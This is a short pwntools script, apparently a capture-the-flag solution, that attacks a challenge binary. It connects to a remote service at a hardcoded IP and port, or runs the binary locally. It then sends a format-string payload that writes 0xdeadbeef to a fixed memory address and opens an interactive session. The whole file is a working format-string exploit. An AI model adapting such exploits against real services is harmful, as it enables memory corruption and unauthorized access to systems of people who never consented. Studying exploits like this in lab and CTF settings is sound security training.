#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("194.31.53.241",1343)

    return r


def main():
    r = conn()
    offset = 8
    value = 0xdeadbeef
    r.sendline(fmtstr_payload(offset,{0x00000000006010ac:value}))
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
